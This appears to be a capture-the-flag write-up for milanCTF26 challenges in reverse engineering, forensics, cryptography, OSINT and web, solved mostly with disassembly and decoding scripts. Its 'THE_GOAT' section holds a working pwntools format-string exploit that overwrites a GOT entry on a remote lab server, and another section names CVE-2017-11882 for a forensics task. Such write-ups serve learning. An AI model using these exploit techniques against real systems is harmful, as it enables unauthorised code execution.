# The image That lied (forensics)

Running `zsteg` on the image gets us the flag.

![TheImageThatLied](<imgs/Screenshot (28).png>)

# Residual (forensics)

Hereing the audio clearly sounds like a `DialTone` being played.

So running 

```bash
ffmpeg -i residual.wav -ar 22050 -ac 1 -f s16le residual.raw
```

Then

```bash
multimon-ng -a DTMF -t residual.wav
```

Gives us the Tones Output:

Which is

```text
78 86 85 87 89 89 76 79 73 78 75 69 77 82 87 80 77 90 87 71 50 66 81 71 78 90
65 54 88 84 80 69 91 72 99 67 55 78 95 80 94 86 54 79 94 89
71 81 90 88 50
```

These are ASCII values. 

So using python to convert Decimal to ASCII

```bash
python3 - <<'PY'
s = """78 86 85 87 89 89 76 79 73 78 75 69 77 82 87 80 77 90 87 71 50 66 81 71 78 90
65 54 88 84 80 69 91 72 99 67 55 78 95 80 94 86 54 79 94 89
71 81 90 88 50"""
print(''.join(chr(int(x)) for x in s.split()))
PY
```
Gives us: 
```text
NVUWYYLOINKEMRMPWMZG2BGQGNZV6YRYPEY4GZC7NAZTI4RRNZT6VJYGQZX2
```

Now using Cipher Identifer says its BASE 32.

Using BASE32 decoded, we get the flag.

![alt text](<imgs/Screenshot (30).png>)


# Magic Number (Reverse_Engineering)

We objdump on the given ELF file. Using the command:

```bash
objdump -d -M intel ./magic_number
```

We can see the input is first loaded into EAX and then some operations are performed.

```text
1153: 35 5a 5a 5a 5a    xor eax,0x5a5a5a5a
1158: c1 c0 07           rol eax,0x7
115b: 05 df 9b 57 13     add eax,0x13579bdf

1160: 89 c2              mov edx,eax
1162: c1 ea 0d           shr edx,0xd
1165: 31 d0              xor eax,edx

1167: 69 c0 3b 9f 5d 04  imul eax,eax,0x45d9f3b

116d: 89 c2              mov edx,eax
116f: c1 e2 0b           shl edx,0xb
1172: 31 d0              xor eax,edx

1174: 3d 0f b3 cc fd     cmp eax,0xfdccb30f
```

Which is basically

```text
x ^= 0x5A5A5A5A;
x = rol(x, 7);
x += 0x13579BDF;
x ^= x >> 13;
x *= 0x045D9F3B;
x ^= x << 11;
```

The result is compared with `0xfdccb30f` 

Now reversing the operations

We get the number `739184`

Running this number in Magic Number

![Magic Number](<imgs/Screenshot (33).png>)


# Backspace (Reverse_Engineering)

We run objdump

```bash
objdump -d -M intel ./calculator
```

These operations are performed

```text
x ^= 0xA5C3F17B;
x += 0x37A91C42;
x *= 0x9E3779B1;
x = rol32(x, 11);
x ^= x >> 16;
x *= 0x85EBCA77;
x = rol32(x, 7);
x = ~x;
x += 0x6D2B79F5;
```

The result is compared with `0x8F42A17C`


So reversing the operations we get `0xB4B892CE` which in integer is `3031995086`

![Backspace](<imgs/Screenshot (34).png>)


# Hidden Switch (Reverse_Engineering)

So first we run `strings` on the file

```bash
strings ./switch
```

this are some important things that we can see
```text
HIDDEN SWITCH
Enter access key:
Access denied.
Access granted!
Flag:
```
```text
svktbj_lg_`ld^taskeu{_4085;1
```
This looks suscipious 

Running disass on main
```bash
objdump -d -M intel switch | sed -n '/<main>:/,/^$/p'
```

We can see that
```text
1178: movdqa xmm0,XMMWORD PTR [rip+0xf40] # 20c0
1180: movaps XMMWORD PTR [rsp],xmm0

1187: movdqa xmm0,XMMWORD PTR [rip+0xf41] # 20d0
118f: movups XMMWORD PTR [rsp+0xc],xmm0
```

16 bytes from 0x20c0 to the stack and again 16 bytes from 0x20d0 but writes at `rsp + 0xc`

if we objdump `.rodata`
```bash
objdump -s --start-address=0x20c0 --stop-address=0x20e0 switch
```

These are the bytes
```text
20c0 73766b74 626a5f6c 675f606c 645e7461
20d0 645e7461 736b6575 7b5f3430 38353b31
```

We can see that this is same as the string we got above by using python code.

So its basically doing 

```text
index % 3 == 0 same
index % 3 == 1 XOR 1
index % 3 == 2 XOR 2
```

we can have a python code to decode the key.

```bash
python3 - <<'PY'
b = (
    bytes.fromhex('73 76 6b 74 62 6a 5f 6c 67 5f 60 6c')
    + bytes.fromhex('64 5e 74 61 73 6b 65 75 7b 5f 34 30 38 35 3b 31')
)

key = bytes(
    c if i % 3 == 0
    else c ^ 1 if i % 3 == 1
    else c ^ 2
    for i, c in enumerate(b)
)

print(key.decode())
PY
```

This gives us `switch_me_and_variety_528491`

Using this on the program gives us the flag.

![HW](<imgs/Screenshot (36).png>)


# Byte by Byte (Reverse_Engineering)

Running the file 
```bash
./x86_binary
```

Shows us the usage syntax
```text
Usage: ./x86_binary <license.dat>
```

So we need a valid licence to run this file.

```bash
nm -C x86_binary
```
running this shows some important stuff one of which is `validate_license`

Now we objdump

```bash
objdump -d -M intel x86_binary | sed -n '/<validate_license>:/,/^$/p'
```

From this we get to know the first four bytes have to be 0xdeadbeef, Since it is litte endian we have to reverse it 
so 0x00 is ef be ad de.

Second is 0x1337 which becomes 37 13 at offset 0x04.

Third, 0x42 becomes 0x06 offset and value is 42 00

Then there is a strcmp.

using strings
```bash
strings -tx x86_binary
```

we get `204b satvik` which is 73 61 74 76 69 6b 00 should be at offset 0x08

finally 
```text
mov rdx,QWORD PTR [rax+0x18]
movabs rax,0xcafebabe12345678
cmp rdx,rax
```

So 0xcafebabe12345678 becomes 78 56 34 12 be ba fe ca, at offset 0x18

Now we find the filesize using

```bash
objdump -d -M intel x86_binary | sed -n '/<main>:/,/^$/p'
```
```text
mov edx,0x1
mov esi,0x20
call fread@plt
```

Which is basically a 32 byte file `fread(buffer, 0x20, 1, file);`

the 32 byte secquence becomes
```text
0x00    ef be ad de
0x04    37 13
0x06    42 00
0x08    73 61 74 76 69 6b 
Padding (0x0F-0x17) 00 00 00 00 00 00 00 00 00 00 00
0x18    78 56 34 12 be ba fe ca
```

Create `licence.dat`

```bash
python3 - <<'PY'
from pathlib import Path

b = bytearray(32)

b[0:4] = (0xDEADBEEF).to_bytes(4, 'little')
b[4:6] = (0x1337).to_bytes(2, 'little')
b[6:8] = (0x42).to_bytes(2, 'little')
b[8:15] = b'satvik\x00'
b[24:32] = (0xCAFEBABE12345678).to_bytes(8, 'little')

Path('license.dat').write_bytes(b)

print("Created license.dat")
print(" ".join(f"{x:02x}" for x in b))
PY
```

Run with licence
```bash
./x86_binary license.dat
```

![BBB](<imgs/Screenshot (39).png>)

# Rootfest (web)

First we curl

```bash
TARGET="http://192.168.78.228:20006"

curl -i "$TARGET/"
```

We can see
```text
<!--
        Attendee session link. Hidden pending the portal soft-launch —
        do not remove from markup, ops team needs this live for judges.
      -->
      <a href="/profile" class="session-entry">My Profile</a>
```

Going to profile
```bash
curl -i "$TARGET/profile/"
```
and then grep milan gives us the flag
```bash
curl -i "$TARGET/profile/" | grep "milan"
```

![alt text](<imgs/Screenshot (40).png>)


# Meow (Forensics)

Runnings strings gives us a hex sequence.
```bash
strings meow
```

Decoding it gives us the flag.

Decoding the Hex we find that its a base 64 text which we decode and get a flag.

```python
import binascii
import base64

hex_data = """
62 57 6c 73 59 57 35 44 56 45 59 79 4e 6e 74 6a 62 32 35 6e 62 31 39 35
4d 48 56 66 5a 6a 46 75 4f 44 45 78 65 56 38 33 4d 47 35 6b 58 32 30 7a
58 7a 42 39
"""

# Remove spaces/newlines
hex_data = "".join(hex_data.split())

# Hex -> ASCII
decoded_hex = bytes.fromhex(hex_data).decode()

print("Hex -> ASCII:")
print(decoded_hex)

# Base64 -> flag
flag = base64.b64decode(decoded_hex).decode()

print("\nBase64 -> Flag:")
print(flag)
```
* We can ask chatGPT to give a python code to convert Hex to Ascii.
* Then we can ask it convert output which is in base64 to text.

![Meow](<imgs/Screenshot (43).png>)

# Netflag (Forensics)

We are given 3 strings which we have to decode

This is basicually NetBIOS

```bash
names = [
    "GNGJGMGBGOGDHEGGDCDGHLEGDAHCDDAA",
    "GODFDBGDDFFPDAHCFPEDHCHJHADHDAAA",
    "FPDCDDDBDCHNAACACACACACACACACACA"
]

decoded = []

for s in names:
    result = bytearray()

    for i in range(0, len(s), 2):
        high = ord(s[i]) - ord('A')
        low = ord(s[i + 1]) - ord('A')
        result.append((high << 4) | low)

    text = result.decode("ascii", errors="replace").rstrip("\x00 ")
    decoded.append(text)
    print(text)
flag = "".join(decoded)
print("\nFlag:")
print(flag)
```

The three strings are 3 parts of the flag. Using this code we can de-code each string and then join all the 3 parts to get the complete fag.

![NetFlag](<imgs/Screenshot (48).png>)


# Find Me 1 (OSINT)

In the image if we zoon, we can see IITH Guesthouse, So its the road behind IITH. Going to the exact same point and putting the coordinates we get the flag.
![FM1](<imgs/Screenshot (49).png>)


# Recursive Vault (Reverse_Engineering)

Running 
```bash
objdump -s -j .rodata recursive_vault
```
Get get the portion where the flag should be printed

Now we can extract the exact location. With python we can get the flag.

```python
from pathlib import Path

data = Path("recursive_vault").read_bytes()

encrypted = data[0x2030:0x2030 + 42]

flag = bytes(b ^ 0x5a for b in encrypted)

print(flag.decode())
```
![RV](<imgs/Screenshot (51).png>)

# Strings Lie (Reverse_Engineering)

Running objdump
```bash
objdump -d -M intel ./strings_lie
```

We get to see
```text
00000000000013b0 <check_password>:
```
```text
13f2:       c7 44 24 03 69 6e 67    mov    DWORD PTR [rsp+0x3],0x73676e69
13ff:       c7 44 24 08 61 72 65    mov    DWORD PTR [rsp+0x8],0x5f657261
1407:       c7 44 24 0c 6e 6f 74    mov    DWORD PTR [rsp+0xc],0x5f746f6e
```

Now decoding the full thing, these are the lines which checks the password:
```text
13c8: b8 73 74 00 00          mov    eax,0x7473
13d0: c6 44 24 02 72          mov    BYTE PTR [rsp+0x2],0x72
13d5: 66 89 04 24             mov    WORD PTR [rsp],ax

13d9: 48 b8 61 6c 77 61 79    movabs rax,0x685f737961776c61
13e3: 48 89 44 24 10          mov    QWORD PTR [rsp+0x10],rax

13e8: 48 b8 5f 68 6f 6e 65    movabs rax,0x7473656e6f685f
13f2: c7 44 24 03 69 6e 67    mov    DWORD PTR [rsp+0x3],0x73676e69
13fa: c6 44 24 07 5f          mov    BYTE PTR [rsp+0x7],0x5f

13ff: c7 44 24 08 61 72 65    mov    DWORD PTR [rsp+0x8],0x5f657261
1407: c7 44 24 0c 6e 6f 74    mov    DWORD PTR [rsp+0xc],0x5f746f6e
140e:       5f
140f: 48 89 44 24 16          mov    QWORD PTR [rsp+0x16],rax

1414: e8 e7 fc ff ff           call   1100 <strcmp@plt>
```

`13c8: b8 73 74 00 00    mov eax,0x7473`

gives us `st`


`13d0: c6 44 24 02 72          mov    BYTE PTR [rsp+0x2],0x72`

gives us `r`

`13f2: c7 44 24 03 69 6e 67`

`13fa: c6 44 24 07 5f`

gives us `ing_`


`13d9: 48 b8 61 6c 77 61 79    movabs rax,0x685f737961776c61`

`0x685f737961776c61` becomes `61 6c 77 61 79 73 5f 68`

gives us `always_h` 


`13e8: 48 b8 5f 68 6f 6e 65    movabs rax,0x7473656e6f685f`

`0x7473656e6f685f` becomes `5f 68 6f 6e 65 73 74 00`

gives us `_honest`


`13ff: c7 44 24 08 61 72 65    mov    DWORD PTR [rsp+0x8],0x5f657261`

`0x5f657261` becomes `61 72 65 5f`

gives us `are_`


`1407: c7 44 24 0c 6e 6f 74    mov    DWORD PTR [rsp+0xc],0x5f746f6e`

`0x5f746f6e` becomes `6e 6f 74 5f`

gives us `not`


`140e: 5f`

gives us `_`


`strings_are_not_always_honest` Finally we get this.

Using this password we get the flag

![SL](<imgs/Screenshot (52).png>)


# Crackme (Reverse_Engineering)


Using this we get to know dependencies, To explain why we get segmentation fault when we run.

```bash
readelf -d crackme | grep NEEDED
```
```text
Shared library: [libchecker.so]
Shared library: [libc.so.6]
```

We can see that there is `check_flag` in the .so
```bash
nm -D lib/libchecker.so | grep check_flag
```

```text
0000000000001140 T check_flag
```

We objdump
```bash
objdump -d -M intel --start-address=0x1140 --stop-address=0x12f9 lib/libchecker.so
```
We get
```text
1156: call   1030 <strlen@plt>
115b: cmp    rax,0x1c
115f: jne    ...
```
So the length is `0x1c` (28 char).

```text
state[0] = ROL8((key[0] ^ 0x52) + 0x23, 1) ^ 0xA7
```

Using:
```bash
xxd -s 0x2048 -l 13 -p lib/libchecker.so
```

Gives us `6d1fa45239c78311e2487b952d`
searching in `.rodata` gives us
`635eec9712730816017a8865e6815c97e38a20932030a819d1772f6b`


```python
def ror8(x, n):
    n %= 8
    return ((x >> n) | (x << (8 - n))) & 0xff

#0x2060
target = bytes.fromhex(
    "635eec9712730816"
    "017a8865e6815c97"
    "e38a20932030a819"
    "d1772f6b"
)

#0x2048
table = bytes.fromhex(
    "6d1fa45239c78311e2487b952d"
)

key = [0] * 28

x = target[0]
x ^= 0xA7
x = ror8(x, 1)
x = (x - 0x23) & 0xff
x ^= 0x52
key[0] = x

x = target[9]
x ^= 0xAC
x = ror8(x, 2)
x = (x - 0x2A) & 0xff
x ^= 0xE2
key[1] = x

for i in range(2, 28):
    j = i - 2
    dst = (9 * i) % 28
    x = target[dst]
    x ^= 0xA7
    x ^= (0x16 + 0x0B * j) & 0xff
    x = ror8(x, (i % 5) + 1)
    x = (x - (0x31 + 7 * j)) & 0xff
    idx = (0x0D + 5 * j) % 13
    x ^= table[idx]
    key[i] = x

password = bytes(key).decode()
print("Password:", password)
print("Length:", len(password))
```

So this gives us password
```text
Password: milanctf_sharedlib_v2_2026!!
Length: 28
```

Running this
```bash
printf '%s\n' 'milanctf_sharedlib_v2_2026!!' | ./crackme
```

Gives segmentation fault, we have to run with loader.

```bash
./lib64/ld-linux-x86-64.so.2 \
    --library-path ./lib \
    ./crackme
```

# FELINE (Cryptography)

We are given the ciphertext `VIFWHOKEADTANYGSRYTF`

`CATS` is the key.

Cipher with a key is generally `Vigenère Cipher`

Using cipher decoder we get `TIMEFORMYDAILYNAPYAN`

This is only the flag.


# Who needs lsfr's ? (Cryptography)

This is `IV || SECRET` Challenge

```text
IV = 8 bits
Secret = 232 bits
LFSR output = MSB-first
```

```
GET /help HTTP/1.1
Host: serve

GET /dashboard HTTP/1.1
Host:

GET /status HTTP/1.1
Host: ser

GET /admin HTTP/1.1
Host: serv

GET /index.html HTTP/1.1
Host:
```

CipherText = Answer XOR Key

We can reverse it by

Key = Ciphertext XOR Answer

```python
import json

def bits_to_bytes(bits: str) -> bytes:
    if len(bits) % 8 != 0:
        raise ValueError("Ciphertext length is not a multiple of 8")

    return bytes(
        int(bits[i:i + 8], 2)
        for i in range(0, len(bits), 8)
    )

with open("encrypted_packets.json", "r") as f:
    packets = json.load(f)

packet = packets[0]

iv = packet["iv"]
ciphertext = bits_to_bytes(packet["ciphertext"])

print(f"[+] Packet ID : {packet['packet_id']}")
print(f"[+] IV        : {iv} (0x{iv:02x})")
print(f"[+] Ciphertext: {len(ciphertext)} bytes")

known_plaintext = b"GET /help HTTP/1.1\nHost: serve"

print(f"[+] Known plaintext length: {len(known_plaintext)}")
keystream = bytes(
    c ^ p
    for c, p in zip(ciphertext[:len(known_plaintext)], known_plaintext)
)

print("\n[+] Recovered keystream:")
print(keystream.hex())

secret = keystream[1:30]

print("\n[+] Recovered secret:")
print(secret.decode("ascii"))

print(f"\n[+] Secret length: {len(secret)} bytes")

for packet in packets:
    iv = packet["iv"]
    ciphertext = bits_to_bytes(packet["ciphertext"])
    # IV || SECRET
    initial_keystream = bytes([iv]) + secret

    decrypted_prefix = bytes(
        c ^ k
        for c, k in zip(ciphertext[:30], initial_keystream)
    )

    print(
        f"packet {packet['packet_id']:2d} "
        f"IV={iv:3d} -> {decrypted_prefix!r}"
    )

print("\n[+] Flag / secret:")
print(secret.decode("ascii"))
```

Using this we get the flag.

![WNI](<imgs/Screenshot (56).png>)

# Rings of lie (Cryptography)

We are given n, c, e and p+q

we have s (i.e. s=p+q) instead of n (i.e. n=p*q)

`x^2 - sx + n = 0`

We can derive from quadratic euqation formula.

`p,q = (s ± sqrt(s^2 - 4n)) / 2`

We can find D

`D = (p + q)^2 - 4n`

`p = ((p + q) + sqrt(D)) / 2`

`q = ((p + q) - sqrt(D)) / 2`

As, 
`phi(n) = (p - 1)(q - 1)`

First we try Regular RSA
`d = e^-1 mod phi(n)`

Since `e=110643` and `gcd(e,phi(n))=3`

So e is not invertible mod phi(n).

So Now, 
`e = 3k`

so,
`k = e / 3`

which is invertible with mod phi(n)

`d = k^-1 mod phi(n)`

`c^d = m^(3kd) = m^3 mod n`

So we can recover m^3 mod n.

Using Python
```python
import math


n = 3688222489650380275558524898502817037840768656751268867591129224754188648834211945226338000585242500702839314711104580360408029699367109976257570189854141112515176457378798355421944698444678078949238155084077911940001779654815447277357824724259595504022911462770582901720706447044255050394749838730601

c = 152651625269082217280210036957063229950451496732571758964891227142797154363859931327212229392299844115617805393315049309224417324818449264343544794689538516252256439916234461463321127034683930777822931941137830995087123807308244741032148037955379947395933831661577449131712691246697462032520776502309

e = 110643

s = 3840949096070074332251602063664886465631188131566786189285588297412384856752987431877925661398543441247496179372377951910869033101235180017952757643370


D = s*s - 4*n
sqrtD = math.isqrt(D)

assert sqrtD*sqrtD == D

p = (s + sqrtD) // 2
q = (s - sqrtD) // 2

assert p*q == n

print("[+] p and q recovered")

phi = (p-1)*(q-1)

print("[+] gcd(e, phi) =", math.gcd(e, phi))

k = e // 3

assert math.gcd(k, phi) == 1

d = pow(k, -1, phi)
m3 = pow(c, d, n)
dp = pow(3, -1, p-1)
mp = pow(m3, dp, p)
sq = (q-1)//3
dq = pow(3, -1, sq)
mq = pow(m3, dq, q)

for a in range(2, 100):
    omega = pow(a, (q-1)//3, q)
    if omega != 1:
        break

assert pow(omega, 3, q) == 1

def crt(a, p, b, q):
    t = ((b-a) * pow(p, -1, q)) % q
    return (a + p*t) % (p*q)

roots = []
for i in range(3):
    rq = (mq * pow(omega, i, q)) % q

    m = crt(mp, p, rq, q)
    roots.append(m)

for i, m in enumerate(roots):
    raw = m.to_bytes((m.bit_length()+7)//8, "big")

    print(f"\nCandidate {i}:")
    print(raw)

    try:
        print(raw.decode())
    except UnicodeDecodeError:
        pass

```
![ROL](<imgs/Screenshot (57).png>)

# Find Me 3 (OSINT)

The yellow board says Shristi Homestay. SO we search that and follow the road till we find 3 dogs.

![FM3](<imgs/Screenshot (58).png>)


# The Broken Invoice (Forensics)

First we extract the ZIP using the first password `invoice4471` 

This gives us a `broken_invoice.doc` file

Now using olefile

```python
import olefile

ole = olefile.OleFileIO("broken_invoice.doc")

for stream in ole.listdir(streams=True, storages=False):
    print("/".join(stream))
```

We get
```text
CompObj
Ole
DocumentSummaryInformation
SummaryInformation
1Table
CaseArtifact
DocumentCache
RecoveryBlob
RevisionData
WordDocument
```
```python
data = ole.openstream("CaseArtifact").read().decode(errors="replace")
print(data)
```
```text
CASE-4471
record=17
artifact_type=embedded_component
encoding=hex-ascii
component_identifier=30303032434530322D303030302D303030302D433030302D303030303030303030303436
recovery_stream=RecoveryBlob
recovery_encoding=base64
source=archived_document

CASE-DATA-CASE-DATA
```

There is a hex string
`30303032434530322D303030302D303030302D433030302D30303030303030303030303436`

Decoding it gives us 

`0002CE02-0000-0000-C000-0000000000046`

This is `CLSID associated with Microsoft Equation 3.0` 
![BI](<imgs/Screenshot (59).png>)
![BI2](<imgs/Screenshot (60).png>)

which is `CVE-2017-11882`

Now `RecoveryBlob` is referenced by `CaseArtifact` So we decode it.

```
import olefile
import base64

ole = olefile.OleFileIO("broken_invoice.doc")

blob = ole.openstream("RecoveryBlob").read()
recovery_zip = base64.b64decode(blob)

with open("recovery.zip", "wb") as f:
    f.write(recovery_zip)
```

Now this needs a password.

Using `CVE-2017-11882` We are able to read `evidence.txt` Which consists the flag.

# THE_GOAT (pwn)

We are given an image.

So running binwalk on the image shows us that There is a Zip in the image

![Goat](<imgs/Screenshot (61).png>)

Using Foremost we extract

This gives us the server executing file i.e. chall (ELF File).

Now we can objdump on it 
```bash
objdump -d -M intel ./chall
```

We can see that the ELF takes input, So we test for `%p`

```bash
python3 -c 'print("%6$p")' | ./chall
```

We get `0xa70243625`

Now doing 
```bash
nm -n ./chall | grep -E ' win$| main$
```

We get 
```text
0000000000401276 T win
000000000040144b T main
```

This 
```bash
objdump -R ./chall
```
```text
DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE
0000000000403fd8 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.34
0000000000403fe0 R_X86_64_GLOB_DAT  __gmon_start__@Base
0000000000404070 R_X86_64_COPY     stdout@GLIBC_2.2.5
0000000000404080 R_X86_64_COPY     stdin@GLIBC_2.2.5
0000000000404000 R_X86_64_JUMP_SLOT  _exit@GLIBC_2.2.5
0000000000404008 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
0000000000404010 R_X86_64_JUMP_SLOT  fclose@GLIBC_2.2.5
0000000000404018 R_X86_64_JUMP_SLOT  __stack_chk_fail@GLIBC_2.4
0000000000404020 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5
0000000000404028 R_X86_64_JUMP_SLOT  fputs@GLIBC_2.2.5
0000000000404030 R_X86_64_JUMP_SLOT  fgets@GLIBC_2.2.5
0000000000404038 R_X86_64_JUMP_SLOT  fflush@GLIBC_2.2.5
0000000000404040 R_X86_64_JUMP_SLOT  setvbuf@GLIBC_2.2.5
0000000000404048 R_X86_64_JUMP_SLOT  fopen@GLIBC_2.2.5
0000000000404050 R_X86_64_JUMP_SLOT  exit@GLIBC_2.2.5
```

We need to target puts instead of win as win calls fputs which calls win which calls fputs


Running the code and changing it to `nc` HOST instead of local ./chall we get the flag.

```python
from pwn import *

HOST = "192.168.78.228"
PORT = 40005

WIN = 0x401276
PUTS_GOT = 0x404008
p = remote(HOST, PORT)

p.recvuntil(b"What's your name? ")

fmt = (
    b"%14$hhn"
    b"%15$hhn"
    b"%16$hhn"
    b"%20$16402c"
    b"%17$hn"
    b"%20$100c"
    b"%18$hhn"
)

fmt = fmt.ljust(64, b"A")
payload = fmt
payload += p64(PUTS_GOT + 3)
payload += p64(PUTS_GOT + 4)
payload += p64(PUTS_GOT + 5)
payload += p64(PUTS_GOT + 1)
payload += p64(PUTS_GOT)
payload += p64(0)
payload += p64(0)
assert b"\n" not in payload

p.sendline(payload)

p.interactive()
```

# permutation dance (Cryptography)

We are given 2 parts of a cipher

In phase 1 we are given cipher text, k and p^k.


We can recover p for every cycle of p^k

`p^k(i) = cycle[(i + k) mod L]`

Since `gcd(k,L)=1`

`p = (p^k)^k^-1`

Using this code:

```python
import re
from math import gcd

with open("perm_cipher_part1.txt") as f:
    data = f.read()

ciphertext = re.search(r"ciphertext = (.+)", data).group(1)
k = int(re.search(r"k = (\d+)", data).group(1))

cycle_text = re.search(r"p\^k = (.+)", data).group(1)

cycles = [
    list(map(int, x.split()))
    for x in re.findall(r"\(([^)]+)\)", cycle_text)
]

n = len(ciphertext)
pk = [None] * (n + 1)

for cycle in cycles:
    for a, b in zip(cycle, cycle[1:] + cycle[:1]):
        pk[a] = b
p = [None] * (n + 1)

for cycle in cycles:
    L = len(cycle)
    assert gcd(k, L) == 1
    inv = pow(k, -1, L)
    for i, pos in enumerate(cycle):
        p[pos] = cycle[(i + inv) % L]
plaintext = "".join(
    ciphertext[p[i] - 1]
    for i in range(1, n + 1)
)
print("[+] Phase 1 plaintext:")
print(plaintext)
```

We get
```
YONE,ANMTFROOSTCLUELESHEMOTHEBSAMATEURTCRYPTOGRAESTHP,CANCERREANALGORIEATSELFCAN'BRETTHMTHATSHREHETULATIOGNSTHEFRAAK.CONISMILATF2AG6{3NGL15H_N_MNCLLEMAK4HISCH197}.WHI7H5_2INGTENGALLOUTTHIEITHOUGHTABQSTEALOUOT.AAYYOUONLYNEEDNYWOLVEFCYCHETOSLEARORTTHEFLAGOUNDCWHITHHISDDLEXXXXXXXXEMIXXXXXXXXXXXX
```

Now for phase 2
```
now the encoder divided the ciphertext in into several blocks and applied a permutation to each block according to the secret random tap positions

One round on a block of length n is:

1. rotate the block one step to the right,
2. swap the leftmost slot with the slot at tap t1,
3. swap the leftmost slot with the slot at tap t2.
```

So now using this code we get the flag

```python
from pathlib import Path

K = 6435501172473662637

block_lengths = (
    25, 28, 20, 25, 22, 27,
    28, 25, 26, 20, 20, 27
)

taps = [
    (12, 7),
    (26, 14),
    (8, 7),
    (21, 22),
    (7, 16),
    (9, 11),
    (6, 19),
    (23, 6),
    (10, 7),
    (8, 13),
    (15, 11),
    (0, 15),
]

def one_round(n, t1, t2):
    p = list(range(n))
    p = p[-1:] + p[:-1]
    p[0], p[t1] = p[t1], p[0]
    p[0], p[t2] = p[t2], p[0]
    return tuple(p)

def perm_power(p, k):
    n = len(p)
    result = tuple(range(n))
    base = p

    while k:
        if k & 1:
            result = tuple(base[result[i]] for i in range(n))
        base = tuple(base[base[i]] for i in range(n))
        k >>= 1
    return result

def decrypt_block(cipher, t1, t2):
    n = len(cipher)
    p = one_round(n, t1, t2)
    pk = perm_power(p, K)
    inv = [0] * n
    for i, x in enumerate(pk):
        inv[x] = i
    return ''.join(cipher[inv[i]] for i in range(n))


#PHASE1 Output
phase1 = "YONE,ANMTFROOSTCLUELESHEMOTHEBSAMATEURTCRYPTOGRAESTHP,CANCERREANALGORIEATSELFCAN'BRETTHMTHATSHREHETULATIOGNSTHEFRAAK.CONISMILATF2AG6{3NGL15H_N_MNCLLEMAK4HISCH197}.WHI7H5_2INGTENGALLOUTTHIEITHOUGHTABQSTEALOUOT.AAYYOUONLYNEEDNYWOLVEFCYCHETOSLEARORTTHEFLAGOUNDCWHITHHISDDLEXXXXXXXXEMIXXXXXXXXXXXX"

blocks = []
pos = 0

for L in block_lengths:
    blocks.append(phase1[pos:pos + L])
    pos += L

plaintext = ''.join(
    decrypt_block(block, t1, t2)
    for block, (t1, t2) in zip(blocks, taps)
)

print("[+] Phase 2 plaintext:")
print(plaintext)

print("\n[+] Flag:")
start = plaintext.find("MILANCTF26{")
if start == -1:
    start = plaintext.find("milanCTF26{")

if start != -1:
    end = plaintext.find("}", start)
    print(plaintext[start:end + 1])
```

We get
```
ANYONE,FROMTHEMOSTCLUELESSAMATEURTOTHEBESTCRYPTOGRAPHER,CANCREATEANALGORITHMTHATSHEHERSELFCAN'TBREAK.CONGRATULATIONSTHEFLAGISMILANCTF26{3NGL15H_N_M47H5_2197}.WHILEMAKINGTHISCHALLENGEITHOUGHTABOUTTHISQUOTEALOT.ANYWAYYOUONLYNEEDTOSOLVEFORTHECYCLEAROUNDTHEFLAGWHICHISTHEMIDDLEXXXXXXXXXXXXXXXXXXXX
```

Here we can see the flag hidden in betten, Just run find `milanCTF26{` and done.


# dead Code (Reverse_Engineering)

run objdump

```bash
objdump -d -M intel dead_code
```

From Disass we can see
```text
fake_check_1
fake_check_2
fake_check_3
real_check
```

and it is doing string length of `0xf` i.e. 15

So the key should be 15 char long.


Also real_check loads `0x735d766f67636973`

Which in little endian
```
73 69 63 67 6f 76 5d 73
s  i  c  g  o  v  ]  s
```

`0x3332375c6a756173`
becomes 
```
73 61 75 6a 5c 37 32 33
s  a  u  j  \  7  2  3
```

The first 8 bytes written at `rbp-0x17` overlap with `rbp-0x10`

So it becomes `sicgov]sauj\723`

Now reversing 

`input[i] XOR (i & 3) == hidden[i]`

Which is `input[i] = hidden[i] XOR (i & 3)`

This gives us 
`shadow_path_731`

This is the access Key
![SP](<imgs/Screenshot (62).png>)

Python
```python
import struct

def recover_key():
    a = 0x735d766f67636973
    b = 0x3332375c6a756173
    hidden = bytearray(15)
    hidden[0:8] = struct.pack("<Q", a)
    hidden[7:15] = struct.pack("<Q", b)
    print("Hidden bytes :", hidden)
    print("Hidden string:", hidden.decode())
    key = bytes(c ^ (i & 3) for i, c in enumerate(hidden))
    return key.decode()

key = recover_key()

print("Access key:", key)
print("Length:", len(key))
```

# is it encrypted ? (Cryptography)

Given `WWxkc2MxbFhOVVJXUlZsNVRtNTBhVTVFVlhwT2FsSm1UVlJXWm1KcVFqQlllazUxV1ROS05XTklVWGhOUnpWbVRYcFJNMDFxUVRKbVVRPT0=`

Cipher identifer says its Base64

![ITE](image.png)

Its a Repeated Base 64

`WWxkc2MxbFhOVVJXUlZsNVRtNTBhVTVFVlhwT2FsSm1UVlJXWm1KcVFqQlllazUxV1ROS05XTklVWGhOUnpWbVRYcFJNMDFxUVRKbVVRPT0=`

`Yldsc1lXNURWRVl5Tm50aU5EVXpOalJmTVRWZmJqQjBYek51WTNKNWNIUXhNRzVmTXpRM01qQTJmUQ==`

`bWlsYW5DVEYyNntiNDUzNjRfMTVfbjB0XzNuY3J5cHQxMG5fMzQ3MjA2fQ`

`milanCTF26{b45364_15_n0t_3ncrypt10n_347206}`

Hence we get the flag

![CipherIdentifer](<imgs/Screenshot (64).png>)

# Shattered Archive (Forensics)

So, `totally_not_a_zip_bomb.zip` Totally its a zip bomb.

running `xxd`

```bash
xxd -l 32 totally_not_a_zip_bomb.zip
```

says `1f 8b 08` which is a gzip

```bash
cp totally_not_a_zip_bomb.zip you_can_find_it.mp4.gz
gunzip -k you_can_find_it.mp4.gz
```

We get 
`you_can_find_it.mp4`

Its not a mp4 its some type of zip, found out to betar. 

As when we opened the original zip using 7zip, suprising we were able to open the mp4 file too, which means the mp4 file was actually a zip and not mp4.


Extracting the tar (fake mp4)
```bash
tar -tvf you_can_find_it.mp4
```
This is also a type of zip, later found out to be gzip, using `file` command.
```bash
keep_going.pls
```

Now we get `final_one.zip`

Unzipping this gives us 

`this_is_the_one.tar.gz`

Then
```bash
tar -tzvf final_extracted/this_is_the_one.tar.gz
```

Then
`last_one.tar`

```bash
tar -tvf last_extracted/last_one.tar
```

Finally we get fragments containing 10 `.data` files. 

Which are actually parts of a zip.

Using `xxd` on each

`PK 03 04` this is zip header.

One fragment contains the ZIP central directory and the End Of Central Directory `PK\x05\x06`

The ZIP central directory gives us the local_header_offset for each entry.

So the correct order is
```
1. hbx46sfyclrl.bin
2. u19tbuerxnfc.bin
3. fwfe1ov5q936.bin
4. 94g7uyh3hngj.bin
